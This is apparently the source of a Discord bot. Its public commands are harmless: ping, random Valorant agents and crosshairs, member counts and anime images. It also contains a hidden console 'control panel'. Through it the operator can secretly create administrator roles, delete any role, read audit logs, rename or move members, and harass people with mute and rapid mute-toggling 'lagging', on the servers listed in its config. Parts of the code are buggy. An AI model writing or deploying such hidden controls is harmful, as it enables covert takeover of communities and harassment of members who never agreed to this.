# Main discord bot file

import discord
from os import getenv
from discord.ext import commands
import logging
import asyncio
from dotenv import load_dotenv
import requests
import sys
from random import randint, choice, uniform
from cfg import SERVERS, CROSSHAIRS

# загружаем токен с виртуального окружения
load_dotenv()

# достаём наш токен по названию
TOKEN = getenv("TOKEN")


# логгер для инфы о запуске бота
logs = logging.getLogger(__name__)
logging.basicConfig(format= "%(asctime)s - %(levelname)s - %(message)s",datefmt="%D %H:%M:%S", level=logging.INFO)

intents = discord.Intents.default() # включает базовые разрешения
intents.guilds = True
intents.voice_states = True
intents.message_content = True # Разрешение на чтение сообщений
intents.members = True # Разрешение видеть людей

bot = commands.Bot(command_prefix="=", intents=intents) # Префикс команд бота


async def console_listener():
    '''**Control Panel**'''
    await bot.wait_until_ready()
    logs.info("Control panel is active. Format:\n<command> <guild_name> <user_id> [role_id/nick\channel_id]")
    while not bot.is_closed():
        command_input = await asyncio.get_event_loop().run_in_executor(None, sys.stdin.readline)
        
        input_parts = command_input.split()

        cmd = input_parts[0].lower()
        
        if not input_parts: # если строка ввода была пуста
            continue
        
        elif len(input_parts) == 1:
            if "format" in input_parts:
                # получить формат написания команд
                logs.info("Format:\n<command> <guild_name> <user_id> [role_id/nick/channel_id]")
                continue
            elif "help" in input_parts:
                # получить инфу по всем существующим командам
                logs.info("All existing commands:\n"\
                "- add_role <guild_name> <user_id> [role_id]\n"\
                "- rm_role <guild_name> <user_id> [role_id]\n"\
                "- set_nick <guild_name> <user_id> [new nickname]\n"\
                "- move <guild_name> <user_id> [channel id]\n"\
                "- format\n" \
                "- roles <guild_name>\n" \
                "- get_logs <guild_name>\n" \
                "- create_admin <guild_name> <role_name>\n" \
                "- del_role <guild_name> <role_id>\n" \
                "- move_all <guild_name> <channel_id> <channel_id>\n" \
                "- mute <guild_name> <user_id>\n" \
                "- unmute <guild_name> <user_id>\n" \
                "- lagging <guild_name> <user_id>\n")
                continue
            logs.error("This command doesn't exist.")
            continue

        elif len(input_parts) == 2:
            if cmd == "roles": # получить список всех существующих ролей на серваке
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    async for role in guild.roles:
                        is_admin = "[admin]" if role.permissions.administrator else "[not admin]"
                        logs.info(f"{is_admin} | {role.name} | {role.id}")
                    continue
                logs.error("There's no this bot on this server")
                continue
            elif cmd == "get_logs": # получить логи
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    
                    async for entry in guild.audit_logs(oldest_first=False,limit=50):
                        logs.info(f"{entry.user} did {entry.action} to {entry.target}")
                    continue
                logs.error("There's no this bot on this server")
                continue
            logs.error("This command doesn't exist.")
            continue


        elif len(input_parts) == 3:
            if cmd == "create_admin": # создание роли с админкой 
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    role_name = " ".join(input_parts[2:])
                    
                    try:
                        perms = discord.Permissions(administrator=True)
                        role = await guild.create_role(reason="eshkere", name=role_name, permissions=perms)
                        logs.info(f"The new admin role {role.name} has been created on {guild.name}\nHere it ID is: {role.id}")
                        continue
                    except Exception as e:
                        logs.error(f"Error occured: {e}")
                        continue
                    
                logs.error(f"Server {input_parts[1]} not in config.")
                continue
                
            if cmd == "del_role": # удаление роли любой на серваке
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    try:
                        role_id = int(input_parts[2])
                        deleting_role = guild.get_role(role_id)
                        if deleting_role is not None:
                            await deleting_role.delete(reason="нааааахуй")
                            logs.info(f"The role {deleting_role.name} has been deleted successfully.")
                            continue
                        else:
                            logs.error(f"Role with ID {role_id} not found in cache. Double-check the ID!")
                    except Exception as e:
                        logs.error(f"Error occured: {e}")
                        continue
                logs.error("There's no this bot on this server")
                continue
            if cmd == "mute": # мут чела
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    try:
                        member = guild.get_member(int(input_parts[2]))
                        if not member:
                            logs.error(f"User {bot.get_user(input_parts[2]).display_name} wasn't found")
                            continue

                        if member.voice.mute:
                            logs.info(f"{member.name} has already muted.")
                            continue

                        await member.edit(mute=True)
                        logs.info(f"User {member.name} has been muted successfully.")
                        continue
                    except Exception as e:
                        logs.error(f"Error occured: {e}")
                        continue
                logs.error("This server isn't saved in cache.")
                continue
            if cmd == "unmute": # размут чела
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    try:
                        member = guild.get_member(int(input_parts[2]))
                        if not member:
                            logs.error(f"User {bot.get_user(input_parts[2]).display_name} wasn't found")
                            continue

                        if not member.voice.mute:
                            logs.info(f"{member.name} has already unmuted.")
                            continue

                        await member.edit(mute=False)
                        logs.info(f"User {member.name} has been unmuted successfully.")
                        continue
                    except Exception as e:
                        logs.error(f"Error occured: {e}")
                        continue
                    
                logs.error("This server isn't saved in cache.")
                continue
            if cmd == "lagging": # лагание 
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    try:
                        member = guild.get_member(int(input_parts[2]))
                        if not member:
                            logs.error(f"User wasn't found")
                            continue
                                
                        if member.voice.mute:
                            await member.edit(mute=False)
                            asyncio.sleep(0.5)

                        logs.info(f"Starting lagging for {member.display_name}...")
                        await asyncio.sleep(1)

                        for _ in range(11):
                            if not member.voice:
                                break

                            randfloat = round(uniform(0.1, 0.8), 2)
                            await member.edit(mute=True)
                            await asyncio.sleep(randfloat)
                            await member.edit(mute=False)
                            
                        logs.info("The lagging completed successfully.")
                        continue
                    except Exception as e:
                        logs.error(f"Error occured: {e}")
                        continue
                logs.error("This server isn't saved in cache.")
                continue
            logs.error("This command doesn't exist.")
            continue
        
        elif len(input_parts) == 4:
            if cmd == "move_all":
                if input_parts[1] in list(SERVERS.keys()):
                    guild = bot.get_guild(SERVERS[input_parts[1]])
                    start_chan = guild.get_channel(int(input_parts[2]))
                    end_channel = guild.get_channel(int(input_parts[3]))

                    if not start_chan or not end_channel:
                        logs.error("There's no some of specified channels on the server.")
                        continue

                    if not start_chan.members:
                        logs.error("There's no members on somewhat of servers.")
                        continue

                    for p in start_chan.members:
                        try:
                            await p.move_to(end_channel)
                        except Exception as e:
                            logs.error(f"Failed to move {p.display_name}: {e}")
                            continue
                        logs.info(f"All members {start_chan.name} was moved to {end_channel.name} successfully.")
                        continue
                    logs.error(f"There's no specified voice_channels on the server.")
                    continue
                logs.error(f"This server isn't saved in cache")
                continue
        try:
            guild = bot.get_guild(SERVERS[input_parts[1]])
            member = guild.get_member(int(input_parts[2]))
            
            if not guild:
                logs.error("Error: Server is not found.")
                continue
            if not member:
                logs.error(f"The {bot.get_user(input_parts[2]).display_name} discord member is not found.")
                continue

            if cmd == "add_role":
                role = guild.get_role(int(input_parts[3]))
                await member.add_roles(role)
                logs.info(f"{member.name} got {role.name}")

            elif cmd == "rm_role":
                role = guild.get_role(int(input_parts[3]))
                await member.remove_roles(role)
                logs.info(f"{member.name} have lost {role.name}")

            elif cmd == "set_nick":
                new_nick = " ".join(input_parts[3:])
                await member.edit(nick=new_nick)
                logs.info(f"The nickname {member.name} has been changed to {new_nick}")
            
            elif cmd == "move":
                chan = guild.get_channel(int(input_parts[3]))
                await member.move_to(chan)
                logs.info(f"The {member.name} has been moved to {chan}")
        except Exception as e:
            logs.error(f"Error execution: {e}")

@bot.event
async def on_ready():
    '''`Willingness Report`'''

    logs.info("Bot has been launched!")
    bot.loop.create_task(console_listener())

@bot.command(name="ping")
async def ping(msg: discord.Message):
    '''`Ping Report`'''

    await msg.reply(f'Delay: {round(bot.latency * 1000)}ms')

@bot.command(name="agent")
async def agent(msg: discord.Message):
    response = requests.get("https://valorant-api.com/v1/agents?language=ru-RU&isPlayableCharacter=true")

    if response.status_code == 200:
        json_data = response.json()
        agents = json_data['data']
        random_agent = agents[randint(0, len(agents) - 1)]
        agent_name = random_agent["displayName"]
        await msg.reply(f"Your random agent: {agent_name}")
    else:
        await msg.reply(f"Error: status code: {response.status_code}")

@bot.command(name="crosshair")
async def crosshair(msg):
    random_crosshair, random_code = choice(list(CROSSHAIRS.items()))
    await msg.reply(f"Your random crosshair: {random_crosshair}\nCode: {random_code}")

@bot.command(name="all_members")
async def show_all(msg: discord.Message):
    '''Count of all members'''
    humans = [member for member in msg.guild.members if not member.bot]
    
    await msg.reply(f"There are {len(humans)} members.")

@bot.command(name="all_roles")
async def all_roles(msg: discord.Message):
    
    count_roles = len(msg.guild.roles) - 1
    for val in msg.guild.roles:
        logs.info(val)
    await msg.reply(f"There are {count_roles} roles")

@bot.command("waifu")
async def generate_waifu(msg: discord.Message):
    response = requests.get("https://api.waifu.pics/sfw/waifu")

    if response.status_code == 200:
        data = response.json()
        img = data['url']
        await msg.reply(img)
    else:
        await msg.reply(f"There's no response from API. Probably API is broken. Response code: {response.status_code}")

@bot.event
async def on_message(msg: discord.Message):
    if msg.author == bot.user:
        return
    
    msg_content = msg.content.lower()

    if "я вахуе" in msg_content or "явахуе" in msg_content:
        await msg.channel.send("Сам вахуе брат")

    await bot.process_commands(msg)

if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except KeyboardInterrupt:
        logs.info("The bot is gonna close...")
        asyncio.sleep(1)